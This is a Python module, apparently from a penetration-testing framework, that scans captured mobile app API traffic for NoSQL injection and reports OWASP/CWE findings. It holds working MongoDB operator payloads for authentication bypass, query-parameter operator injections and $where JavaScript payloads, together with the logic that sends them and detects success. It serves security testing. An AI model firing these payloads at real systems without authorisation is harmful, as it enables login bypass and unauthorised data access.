"""
Jarwis AGI Pen Test - Mobile NoSQL Injection Scanner

Detects NoSQL Injection vulnerabilities in mobile app API traffic.
Extends BaseMobileScanner for MITM-first methodology.

OWASP Mobile Top 10 2024: M4 - Insufficient Input/Output Validation
CWE-943: Improper Neutralization of Special Elements in Data Query Logic

Mobile-specific considerations:
- Mobile apps often use MongoDB, Firebase, or similar NoSQL backends
- GraphQL APIs are common in mobile apps
- JSON body manipulation is primary attack vector
- Many mobile backends use Node.js with Mongoose
"""

import asyncio
import logging
import re
import json
from typing import Dict, List, Optional, Any

from attacks.mobile.base_mobile_scanner import (
    BaseMobileScanner,
    MobileFinding,
    Severity,
    Confidence
)
from core.mobile_http_client import MobileHTTPClient, MobileAttackResponse
from core.mobile_request_store import MobileRequestStoreDB, StoredMobileRequest

logger = logging.getLogger(__name__)


class MobileNoSQLScanner(BaseMobileScanner):
    """
    NoSQL Injection Scanner for Mobile APIs
    
    Scans mobile app traffic for NoSQL injection vulnerabilities.
    Uses MITM-captured requests to test injection points.
    
    Attack vectors:
    - MongoDB operator injection ($ne, $gt, $regex, $where)
    - JavaScript injection in $where clauses
    - Authentication bypass via operators
    - Boolean-based extraction
    - Firebase-specific attacks
    """
    
    # Scanner identification
    scanner_name = "mobile_nosql"
    attack_type = "nosql_injection"
    vuln_type = "nosql_injection"
    owasp_category = "M4"  # Insufficient Input/Output Validation
    cwe_id = "CWE-943"
    
    # MongoDB error patterns
    MONGO_ERRORS = [
        r'MongoError',
        r'MongoDB',
        r'mongo.*exception',
        r'\$where.*requires',
        r'bad query',
        r'OperationFailure',
        r'cannot\s+be\s+applied\s+to',
        r'unrecognized\s+expression',
        r'\$or.*array',
        r'use\s+of\s+undefined\s+variable',
        r'SyntaxError.*Unexpected\s+token',
        r'Cannot\s+apply.*on\s+field',
        r'Query\s+failed',
        r'BSONObj\s+size',
        r'invalid operator',
        r'Cast.*failed',
        r'Mongoose.*error',
    ]
    
    # Firebase error patterns
    FIREBASE_ERRORS = [
        r'FirebaseError',
        r'firebase.*permission',
        r'PERMISSION_DENIED',
        r'Missing or insufficient permissions',
        r'rules\s+violation',
    ]
    
    # CouchDB/PouchDB error patterns
    COUCHDB_ERRORS = [
        r'CouchDB',
        r'invalid_json',
        r'bad_request',
        r'PouchDB',
    ]
    
    # Authentication bypass payloads (JSON body injection)
    AUTH_BYPASS_PAYLOADS = [
        # $ne (not equal) - always true
        '{"$ne": ""}',
        '{"$ne": null}',
        '{"$ne": "invalid"}',
        
        # $gt (greater than) - always true for strings
        '{"$gt": ""}',
        '{"$gte": ""}',
        
        # $regex - match all
        '{"$regex": ".*"}',
        '{"$regex": "^.*$"}',
        
        # $exists - bypass empty checks
        '{"$exists": true}',
        
        # $nin - not in empty array
        '{"$nin": []}',
        
        # $or always true
        '{"$or": [{"x": 1}, {"x": {"$ne": 1}}]}',
    ]
    
    # Operator injection for query parameters
    OPERATOR_PAYLOADS = [
        '[$ne]=',
        '[$gt]=',
        '[$regex]=.*',
        '[$exists]=true',
        '[$nin]=',
    ]
    
    # JavaScript injection in $where
    JS_PAYLOADS = [
        "'; return true; //",
        "'; return 1==1; //",
        "1; return true",
        "function() { return true; }",
        "this.password.match(/.*/)//",
        "sleep(3000)",
    ]
    
    # High-priority parameters for NoSQL injection
    PRIORITY_PARAMS = [
        'username', 'user', 'email', 'password', 'pass', 'pwd',
        'login', 'id', 'uid', 'userId', 'user_id', 'query',
        'filter', 'where', 'search', 'find', 'selector', 'q'
    ]
    
    def __init__(
        self,
        http_client: MobileHTTPClient,
        request_store: MobileRequestStoreDB,
        test_firebase: bool = True,
        **kwargs
    ):
        """
        Initialize Mobile NoSQL Scanner.
        
        Args:
            http_client: Mobile HTTP client for attacks
            request_store: Mobile request store
            test_firebase: Test Firebase-specific patterns
        """
        super().__init__(http_client, request_store, **kwargs)
        self.test_firebase = test_firebase
    
    def get_payloads(self) -> List[str]:
        """Return operator injection payloads."""
        return self.AUTH_BYPASS_PAYLOADS[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredMobileRequest) -> bool:
        """Check if request should be tested for NoSQL injection."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters or JSON body
        if not request.parameters and not request.body:
            return False
        
        # Check content type for JSON
        content_type = request.headers.get('content-type', '').lower()
        is_json = 'json' in content_type
        
        # Prioritize JSON APIs (common for NoSQL backends)
        if is_json:
            return True
        
        # Check for priority params
        param_names = [p.lower() for p in request.parameters.keys()]
        has_priority_param = any(
            any(prio in name for prio in self.PRIORITY_PARAMS)
            for name in param_names
        )
        
        return has_priority_param
    
    async def scan_request(self, request: StoredMobileRequest) -> List[MobileFinding]:
        """
        Scan a request for NoSQL injection vulnerabilities.
        
        Flow:
        1. Get baseline response
        2. Test JSON body operator injection
        3. Test query parameter operator injection
        4. Test JavaScript injection in $where
        5. Check for error-based detection
        """
        findings = []
        
        # Get baseline response
        baseline = await self.get_baseline(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] No baseline for {request.url}")
            return findings
        
        # Check if JSON body request
        content_type = request.headers.get('content-type', '').lower()
        is_json_body = 'json' in content_type and request.body
        
        # 1. Test JSON body injection
        if is_json_body:
            json_finding = await self._test_json_body_injection(request, baseline)
            if json_finding:
                findings.append(json_finding)
        
        # 2. Test query parameter operator injection
        for param_name, param_value in request.parameters.items():
            if self._cancelled:
                break
            
            # Test operator injection
            operator_finding = await self._test_operator_injection(
                request, param_name, baseline
            )
            if operator_finding:
                findings.append(operator_finding)
        
        # 3. Test JavaScript injection (for $where clauses)
        if is_json_body:
            js_finding = await self._test_js_injection(request, baseline)
            if js_finding:
                findings.append(js_finding)
        
        return findings
    
    async def _test_json_body_injection(
        self,
        request: StoredMobileRequest,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test JSON body for NoSQL operator injection."""
        if not request.body:
            return None
        
        try:
            original_body = json.loads(request.body)
        except (json.JSONDecodeError, TypeError):
            return None
        
        # Test each field in JSON body
        for field_name, field_value in original_body.items():
            if not isinstance(field_value, str):
                continue
            
            # Test operator injection payloads
            for payload_str in self.AUTH_BYPASS_PAYLOADS:
                try:
                    payload_obj = json.loads(payload_str)
                except json.JSONDecodeError:
                    continue
                
                # Create modified body
                modified_body = original_body.copy()
                modified_body[field_name] = payload_obj
                
                # Send request with modified body
                response = await self.send_payload(
                    request,
                    json.dumps(modified_body),
                    location="body",
                    param_name=field_name
                )
                
                if not response:
                    continue
                
                # Check for NoSQL errors
                if self._detect_nosql_error(response):
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload_str,
                        title=f"NoSQL Injection in JSON body field: {field_name}",
                        description=(
                            f"The field '{field_name}' in the JSON request body is vulnerable "
                            f"to NoSQL operator injection. The payload {payload_str} triggered "
                            "a database error, indicating the input is interpreted as a MongoDB operator."
                        ),
                        severity=Severity.HIGH,
                        confidence=Confidence.HIGH
                    )
                
                # Check for auth bypass (successful login with operator)
                if self._detect_auth_bypass(baseline, response, field_name):
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload_str,
                        title=f"NoSQL Authentication Bypass via {field_name}",
                        description=(
                            f"The '{field_name}' field is vulnerable to NoSQL operator injection "
                            f"that bypasses authentication. Using {payload_str} resulted in "
                            "successful authentication without valid credentials."
                        ),
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH
                    )
        
        return None
    
    async def _test_operator_injection(
        self,
        request: StoredMobileRequest,
        param_name: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test query parameter for NoSQL operator injection."""
        for operator in self.OPERATOR_PAYLOADS:
            # Create modified parameter name with operator
            injected_param = f"{param_name}{operator}"
            
            response = await self.send_payload(
                request,
                "1",  # Value
                location="query",
                param_name=injected_param
            )
            
            if not response:
                continue
            
            if self._detect_nosql_error(response):
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=injected_param,
                    title=f"NoSQL Operator Injection in: {param_name}",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to NoSQL operator injection. "
                        f"The operator payload '{operator}' triggered a database error."
                    ),
                    severity=Severity.HIGH,
                    confidence=Confidence.MEDIUM
                )
        
        return None
    
    async def _test_js_injection(
        self,
        request: StoredMobileRequest,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for JavaScript injection in $where clauses."""
        if not request.body:
            return None
        
        try:
            original_body = json.loads(request.body)
        except (json.JSONDecodeError, TypeError):
            return None
        
        # Try adding $where clause
        for js_payload in self.JS_PAYLOADS[:3]:  # Limit for performance
            modified_body = original_body.copy()
            modified_body["$where"] = js_payload
            
            response = await self.send_payload(
                request,
                json.dumps(modified_body),
                location="body",
                param_name="$where"
            )
            
            if not response:
                continue
            
            # Check for execution indicators
            if self._detect_js_execution(response, baseline):
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=js_payload,
                    title="NoSQL JavaScript Injection ($where)",
                    description=(
                        f"The request is vulnerable to JavaScript injection via MongoDB $where clause. "
                        f"The payload '{js_payload}' was executed server-side, allowing arbitrary "
                        "JavaScript execution within the database context."
                    ),
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH
                )
        
        return None
    
    def _detect_nosql_error(self, response: MobileAttackResponse) -> bool:
        """Detect NoSQL database errors in response."""
        if not response or not response.body:
            return False
        
        response_text = response.body.lower() if isinstance(response.body, str) else str(response.body).lower()
        
        # Check all error patterns
        all_patterns = self.MONGO_ERRORS + self.FIREBASE_ERRORS + self.COUCHDB_ERRORS
        
        for pattern in all_patterns:
            try:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            except re.error:
                continue
        
        return False
    
    def _detect_auth_bypass(
        self,
        baseline: MobileAttackResponse,
        response: MobileAttackResponse,
        field_name: str
    ) -> bool:
        """Detect authentication bypass via NoSQL injection."""
        if not response:
            return False
        
        # Common auth bypass indicators
        auth_fields = ['password', 'pass', 'pwd', 'username', 'user', 'email', 'login']
        if field_name.lower() not in auth_fields:
            return False
        
        # Check status code change (401/403 -> 200)
        if baseline.status_code in [401, 403] and response.status_code == 200:
            return True
        
        # Check for auth tokens in response
        response_text = response.body.lower() if isinstance(response.body, str) else str(response.body).lower()
        auth_indicators = ['token', 'jwt', 'session', 'access_token', 'logged_in', 'authenticated']
        
        if response.status_code == 200:
            for indicator in auth_indicators:
                if indicator in response_text:
                    return True
        
        return False
    
    def _detect_js_execution(
        self,
        response: MobileAttackResponse,
        baseline: MobileAttackResponse
    ) -> bool:
        """Detect JavaScript execution in $where clause."""
        if not response:
            return False
        
        # Successful execution might return data when baseline didn't
        if response.status_code == 200 and baseline.status_code != 200:
            return True
        
        # Check response length change (data extraction)
        if response.content_length and baseline.content_length:
            if response.content_length > baseline.content_length * 1.5:
                return True
        
        return False
